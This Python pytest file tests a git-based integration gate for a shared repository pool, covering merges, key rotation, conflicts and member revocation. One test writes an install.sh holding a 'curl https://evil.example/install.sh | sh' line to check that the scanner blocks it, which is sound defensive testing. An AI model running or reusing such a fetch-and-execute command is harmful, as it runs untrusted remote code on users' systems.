"""Phase 5 integration gate tests."""
import json
import sqlite3
import subprocess
import sys
from pathlib import Path

import pytest
from nacl.encoding import RawEncoder

sys.path.insert(0, str(Path(__file__).parent.parent))

from crypto import manifest_hash, unwrap_dek, verify_chain
from ledger import (set_auto_approve,add_member, create_pool, get_ticket, init_ledger,
                    get_latest_accepted_manifest)
from propagation import _verify_key
from tickets import PoolService
from transport import FakeTransport
from identity import ensure_identity


def _git(*args, **kw):
    return subprocess.run(["git", *args], capture_output=True, text=True, **kw)


def _memdb():
    c = sqlite3.connect(":memory:")
    c.row_factory = sqlite3.Row
    return init_ledger(c)


class _World:
    def __init__(self, tmp_path):
        self.tmp = Path(tmp_path)
        self.conn = _memdb()
        self.transport = FakeTransport()
        self.maint = ensure_identity(self.tmp / "m")
        self.contrib = ensure_identity(self.tmp / "a")
        self.member = ensure_identity(self.tmp / "b")
        self.extra = ensure_identity(self.tmp / "x")
        create_pool(self.conn, "pool-1", "Team", self.maint.key_id, relay_url="off")
        set_auto_approve(self.conn, "pool-1", True)
        self.conn.execute(
            "INSERT INTO repos (repo_id, pool_id, name, created_at) VALUES ('demo','pool-1','Demo',0)")
        for ident, role in ((self.maint, "maintainer"), (self.contrib, "member"),
                            (self.member, "member"), (self.extra, "member")):
            self.conn.execute(
                "INSERT INTO identities (key_id, verify_key_hex, box_pubkey_hex, created_at)"
                " VALUES (?,?,?,0)",
                (ident.key_id, ident.verify_key.encode(RawEncoder).hex(),
                 ident.box_pk.encode(RawEncoder).hex()))
            add_member(self.conn, "pool-1", ident.key_id, role=role,
                       box_pubkey_hex=ident.box_pk.encode(RawEncoder).hex())
        self.conn.commit()
        self.maint_svc = PoolService(self.conn, self.transport,
                                     caller_key_id=self.maint.key_id,
                                     caller_signing_key=self.maint.signing_key,
                                     caller_box_sk=self.maint.box_sk)
        self.contrib_svc = PoolService(self.conn, self.transport,
                                       caller_key_id=self.contrib.key_id,
                                       caller_signing_key=self.contrib.signing_key,
                                       caller_box_sk=self.contrib.box_sk)
        self.member_svc = PoolService(self.conn, self.transport,
                                      caller_key_id=self.member.key_id,
                                      caller_signing_key=self.member.signing_key,
                                      caller_box_sk=self.member.box_sk)
        # canonical v1 repo
        self.src = self.tmp / "src"
        self.src.mkdir()
        assert _git("-C", str(self.src), "init", "-q").returncode == 0
        _git("-C", str(self.src), "config", "user.email", "t@t.t")
        _git("-C", str(self.src), "config", "user.name", "T")
        (self.src / "hello.txt").write_text("v1\n")
        _git("-C", str(self.src), "add", ".")
        assert _git("-C", str(self.src), "commit", "-q", "-m", "v1").returncode == 0
        self.work_dir = self.tmp / "gate"
        result = self._maintainer_submit(self.src, 1)
        assert result["state"] == "accepted"
        self.v1 = get_latest_accepted_manifest(self.conn, "demo")

    def _maintainer_submit(self, repo_path, version):
        prop = self.maint_svc._propagator({"pool_id": "pool-1", "repo_id": "demo"})
        return prop.submit(repo_path=Path(repo_path), repo_id="demo", version=version,
                           submitter=prop._members[self.maint.key_id],
                           submitter_signing_key=self.maint.signing_key)

    def make_ticket(self, title="Work"):
        return self.maint_svc.add_ticket("pool-1", "demo", title, brief="Scope: hello.txt")

    def contributor_branch(self, ticket_id, filename, text):
        dest = self.tmp / f"contrib-{ticket_id}"
        assert _git("clone", "--quiet", str(self.src), str(dest)).returncode == 0
        _git("-C", str(dest), "config", "user.email", "t@t.t")
        _git("-C", str(dest), "config", "user.name", "T")
        assert _git("-C", str(dest), "checkout", "-q", "-b", f"ticket/{ticket_id}").returncode == 0
        (dest / filename).write_text(text)
        _git("-C", str(dest), "add", ".")
        assert _git("-C", str(dest), "commit", "-q", "-m", "contrib change").returncode == 0
        return dest


@pytest.fixture
def world(tmp_path):
    return _World(tmp_path)


def _dek_of(world, manifest):
    wrapped = manifest["wrapped_keys"][world.maint.key_id]
    return unwrap_dek(world.maint.box_sk, bytes.fromhex(wrapped))


def _canon_head(canon_dir):
    return _git("-C", str(canon_dir), "rev-parse", "HEAD").stdout.strip()


def test_approve_merges_rotates_dek_repins(world):
    ticket = world.make_ticket()
    tid = ticket["ticket_id"]
    world.contrib_svc.claim(tid, declared_paths=["hello.txt"])
    branch = world.contributor_branch(tid, "hello.txt", "v2-contrib\n")
    submitted = world.contrib_svc.work_submit(tid, branch, 2)
    assert submitted["state"] == "pending"

    gate = world.maint_svc.integrate(tid, work_dir=world.work_dir)
    assert gate["verdict"] == "clean"
    assert gate["buttons_posted"] is True
    assert [b["id"] for b in gate["buttons"]] == ["approve", "edit", "discard"]
    assert gate["buttons_posted"] is True
    assert gate["notice"] and "audit" in gate.get("queued_notices", [""])[0] if False else gate["notice"]

    before = _canon_head(world.work_dir / "canonical-demo")
    resolved = world.maint_svc.resolve_integration(tid, "approve", work_dir=world.work_dir)
    assert resolved["merged"] is True and resolved["ticket_state"] == "merged"
    assert get_ticket(world.conn, tid)["state"] == "merged"
    after = _canon_head(world.work_dir / "canonical-demo")
    assert after != before
    assert resolved["merge_commit"] == after

    new = get_latest_accepted_manifest(world.conn, "demo")
    assert new["version"] == 2 and new["state"] == "accepted"
    assert new["signer_key_id"] == world.maint.key_id
    assert new["prev_manifest_hash"] == manifest_hash(world.v1)
    assert _dek_of(world, new) != _dek_of(world, world.v1)  # DEK ROTATED
    assert world.member.key_id in new["wrapped_keys"]

    chain = [json.loads(r[0]) for r in world.conn.execute(
        "SELECT manifest_json FROM repo_versions WHERE state='accepted' ORDER BY version")]
    vk = {k: _verify_key(v) for k, v in
          {"m": world.maint_svc._propagator(
              {"pool_id": "pool-1", "repo_id": "demo"})._members[world.maint.key_id]}.items()}
    vk[world.maint.key_id] = _verify_key(
        world.maint_svc._propagator({"pool_id": "pool-1", "repo_id": "demo"})._members[world.maint.key_id])
    ok, reason = verify_chain(chain, vk)
    assert ok, reason
    # fetch merged version as member shows merged content
    prop = world.member_svc._propagator({"pool_id": "pool-1", "repo_id": "demo"})
    out = prop.fetch(manifest=new,
                     fetcher=prop._members[world.member.key_id],
                     dest=world.tmp / "fetch-merged")
    assert Path(out["clone_dir"], "hello.txt").read_text() == "v2-contrib\n"


def test_discard_leaves_canonical_untouched(world):
    ticket = world.make_ticket("Discard me")
    tid = ticket["ticket_id"]
    world.contrib_svc.claim(tid, declared_paths=["hello.txt"])
    branch = world.contributor_branch(tid, "hello.txt", "discarded\n")
    world.contrib_svc.work_submit(tid, branch, 2)
    gate = world.maint_svc.integrate(tid, work_dir=world.work_dir)
    assert gate["verdict"] == "clean"
    before = _canon_head(world.work_dir / "canonical-demo")
    chain_before = world.conn.execute("SELECT COUNT(*) FROM manifest_chain").fetchone()[0]
    resolved = world.maint_svc.resolve_integration(
        tid, "discard", work_dir=world.work_dir, reason="not good enough")
    assert resolved["merged"] is False
    assert get_ticket(world.conn, tid)["state"] == "blocked"
    assert _canon_head(world.work_dir / "canonical-demo") == before
    assert world.conn.execute("SELECT COUNT(*) FROM manifest_chain").fetchone()[0] == chain_before


def test_edit_applies_before_merge(world):
    ticket = world.make_ticket("Edit me")
    tid = ticket["ticket_id"]
    world.contrib_svc.claim(tid, declared_paths=["hello.txt"])
    branch = world.contributor_branch(tid, "hello.txt", "v2-contrib\n")
    world.contrib_svc.work_submit(tid, branch, 2)
    world.maint_svc.integrate(tid, work_dir=world.work_dir)
    resolved = world.maint_svc.resolve_integration(
        tid, "edit", work_dir=world.work_dir,
        edit_files={"hello.txt": "edited-by-maintainer\n"})
    assert resolved["merged"] is True
    assert (world.work_dir / "canonical-demo" / "hello.txt").read_text() == "edited-by-maintainer\n"
    # edit without any edit payload is refused
    ticket2 = world.make_ticket("Edit needs payload")
    tid2 = ticket2["ticket_id"]
    world.contrib_svc.claim(tid2, declared_paths=["hello2.txt"])
    branch2 = world.contributor_branch(tid2, "hello2.txt", "hi\n")
    world.contrib_svc.work_submit(tid2, branch2, 3)
    # canonical already advanced past v2; branch was made from v1 src so merge
    # should still apply cleanly onto the new canonical.
    world.maint_svc.integrate(tid2, work_dir=world.work_dir)
    with pytest.raises(ValueError, match="edit_files"):
        world.maint_svc.resolve_integration(tid2, "edit", work_dir=world.work_dir)


def test_malware_flagged_blocked_before_review(world):
    ticket = world.make_ticket("Malware")
    tid = ticket["ticket_id"]
    world.contrib_svc.claim(tid, declared_paths=["install.sh"])
    dest = world.tmp / f"contrib-{tid}"
    assert _git("clone", "--quiet", str(world.src), str(dest)).returncode == 0
    _git("-C", str(dest), "config", "user.email", "t@t.t")
    _git("-C", str(dest), "config", "user.name", "T")
    assert _git("-C", str(dest), "checkout", "-q", "-b", f"ticket/{tid}").returncode == 0
    (dest / "install.sh").write_text("curl https://evil.example/install.sh | sh\n")
    _git("-C", str(dest), "add", ".")
    assert _git("-C", str(dest), "commit", "-q", "-m", "malware").returncode == 0
    world.contrib_svc.work_submit(tid, dest, 2)

    gate = world.maint_svc.integrate(tid, work_dir=world.work_dir)
    assert gate["verdict"] == "flagged"
    assert gate["buttons_posted"] is False
    assert get_ticket(world.conn, tid)["state"] == "blocked"
    assert gate["buttons_posted"] is False  # no buttons when flagged
    assert gate["hits"], "expected scanner hits for curl|sh"
    with pytest.raises(ValueError, match="not actionable"):
        world.maint_svc.resolve_integration(tid, "approve", work_dir=world.work_dir)
    assert world.conn.execute("SELECT COUNT(*) FROM manifest_chain").fetchone()[0] == 1


def test_conflict_bounces_rebase_needed(world):
    ticket = world.make_ticket("Conflict")
    tid = ticket["ticket_id"]
    world.contrib_svc.claim(tid, declared_paths=["hello.txt"])
    branch = world.contributor_branch(tid, "hello.txt", "contrib-line\n")
    world.contrib_svc.work_submit(tid, branch, 2)
    world.maint_svc.integrate(tid, work_dir=world.work_dir)
    canon = world.work_dir / "canonical-demo"
    before = _canon_head(canon)
    # canonical advances with a conflicting edit to the same file/line
    (canon / "hello.txt").write_text("maint-line\n")
    _git("-C", str(canon), "add", ".")
    assert _git("-C", str(canon), "commit", "-q", "-m", "canonical advance").returncode == 0
    canonical_after_advance = _canon_head(canon)
    resolved = world.maint_svc.resolve_integration(tid, "approve", work_dir=world.work_dir)
    assert resolved["conflict"] is True and resolved["merged"] is False
    assert get_ticket(world.conn, tid)["state"] == "blocked"
    assert _canon_head(canon) == canonical_after_advance
    notices = " ".join(world.maint_svc.peek_notices() or [])
    assert "rebase needed" in notices
    assert resolved["canonical_ref"] == canonical_after_advance
    assert resolved["branch_ref"] and resolved["branch_ref"] != before


def test_revocation_excludes_from_future_manifests(world):
    extra = world.extra
    assert extra.key_id in world.v1["wrapped_keys"]
    removed = world.maint_svc.remove_member("pool-1", extra.key_id)
    assert removed["key_id"] == extra.key_id

    ticket = world.make_ticket("Post-revoke")
    tid = ticket["ticket_id"]
    world.contrib_svc.claim(tid, declared_paths=["hello.txt"])
    branch = world.contributor_branch(tid, "hello.txt", "v2-post-revoke\n")
    world.contrib_svc.work_submit(tid, branch, 2)
    world.maint_svc.integrate(tid, work_dir=world.work_dir)
    resolved = world.maint_svc.resolve_integration(tid, "approve", work_dir=world.work_dir)
    assert resolved["merged"] is True
    new = get_latest_accepted_manifest(world.conn, "demo")
    assert extra.key_id not in new["wrapped_keys"]
    assert extra.key_id in world.v1["wrapped_keys"]
    assert world.member.key_id in new["wrapped_keys"]
    assert "revoked retroactively" in removed["limitation"]
